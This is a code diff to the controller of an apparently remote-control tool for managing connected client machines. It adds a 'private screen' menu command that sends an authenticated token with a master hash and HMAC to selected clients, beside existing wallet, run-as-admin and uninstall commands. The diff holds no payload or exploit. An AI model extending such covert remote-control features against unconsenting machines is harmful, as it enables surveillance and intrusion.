@@ -354,6 +354,7 @@ CMy2015RemoteDlg::CMy2015RemoteDlg(CWnd* pParent): CDialogEx(CMy2015RemoteDlg::I
 	m_bmOnline[13].LoadBitmap(IDB_BITMAP_ADDWATCH);
 	m_bmOnline[14].LoadBitmap(IDB_BITMAP_ADMINRUN);
 	m_bmOnline[15].LoadBitmap(IDB_BITMAP_UNINSTALL);
+	m_bmOnline[16].LoadBitmap(IDB_BITMAP_PDESKTOP);
 
 	for (int i = 0; i < PAYLOAD_MAXTYPE; i++) {
 		m_ServerDLL[i] = nullptr;
@@ -481,6 +482,7 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
 	ON_COMMAND(ID_MAIN_WALLET, &CMy2015RemoteDlg::OnMainWallet)
 	ON_COMMAND(ID_TOOL_RCEDIT, &CMy2015RemoteDlg::OnToolRcedit)
 	ON_COMMAND(ID_ONLINE_UNINSTALL, &CMy2015RemoteDlg::OnOnlineUninstall)
+	ON_COMMAND(ID_ONLINE_PRIVATE_SCREEN, &CMy2015RemoteDlg::OnOnlinePrivateScreen)
 END_MESSAGE_MAP()
 
 
@@ -1468,6 +1470,7 @@ void CMy2015RemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
 	Menu.SetMenuItemBitmaps(ID_ONLINE_ADD_WATCH, MF_BYCOMMAND, &m_bmOnline[13], &m_bmOnline[13]);
 	Menu.SetMenuItemBitmaps(ID_ONLINE_RUN_AS_ADMIN, MF_BYCOMMAND, &m_bmOnline[14], &m_bmOnline[14]);
 	Menu.SetMenuItemBitmaps(ID_ONLINE_UNINSTALL, MF_BYCOMMAND, &m_bmOnline[15], &m_bmOnline[15]);
+	Menu.SetMenuItemBitmaps(ID_ONLINE_PRIVATE_SCREEN, MF_BYCOMMAND, &m_bmOnline[16], &m_bmOnline[16]);
 
 	std::string masterHash(GetMasterHash());
 	if (GetPwdHash() != masterHash || m_superPass.empty()) {
@@ -3332,4 +3335,16 @@ void CMy2015RemoteDlg::OnOnlineUninstall()
 		ShowMessage("操作成功", strIP);
 	}
 	LeaveCriticalSection(&m_cs);
+}
+
+
+void CMy2015RemoteDlg::OnOnlinePrivateScreen()
+{
+	std::string masterId = GetPwdHash(), hmac = GetHMAC();
+	if (hmac.empty())
+		hmac = THIS_CFG.GetStr("settings", "HMAC");
+	BYTE bToken[101] = { TOKEN_PRIVATESCREEN };
+	memcpy(bToken + 1, masterId.c_str(), masterId.length());
+	memcpy(bToken + 1 + masterId.length(), hmac.c_str(), hmac.length());
+	SendSelectedCommand(bToken, sizeof(bToken));
 }
